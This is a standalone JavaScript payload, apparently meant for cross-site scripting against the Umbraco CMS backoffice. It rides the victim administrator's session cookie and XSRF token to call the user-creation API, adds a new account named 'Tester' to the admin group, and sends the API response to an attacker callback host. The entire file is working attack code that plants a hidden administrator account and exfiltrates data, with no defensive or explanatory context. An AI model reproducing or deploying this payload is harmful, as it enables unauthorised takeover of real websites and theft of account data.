// Payload configuration
const userName = "Tester";
const userEmail = "tester@demo.umbsec.icu";
const userGroups = ["admin"];
const callbackURL = "http://kali.umbsec.icu/";

(async function () {
  // Create user object
  const data = {
    id: -1,
    parentId: -1,
    name: userName,
    email: userEmail,
    userGroups: userGroups,
  };

  // Call create user API
  const response = await fetch(
    "/umbraco/backoffice/UmbracoApi/Users/PostCreateUser",
    {
      method: "POST",
      body: JSON.stringify(data),
      // Ensure cookies (specifically the Umbraco auth cookie) are sent with the request.
      credentials: "include",
      headers: {
        // Umbraco's XSRF token needs to be passed in a custom header.
        // This is set in a non-HttpOnly cookie so we can retrieve it in JavaScript.
        "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
        "Content-Type": "application/json",
      },
    }
  );

  // Parse response and send to the callback URL
  const json = toJSON(fromJSON(await response.text()));
  await fetch(callbackURL, {
    method: "POST",
    body: json,
  });

  /* 
   * Helper Functions
   */

  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(";").shift();
  }

  function fromJSON(responseText) {
    // Remove XSSI prevention prefix from response body before parsing
    return JSON.parse(responseText.slice(6));
  }

  function toJSON(object) {
    // Pretty print with an indent of 2 spaces
    return JSON.stringify(object, null, 2);
  }
})();
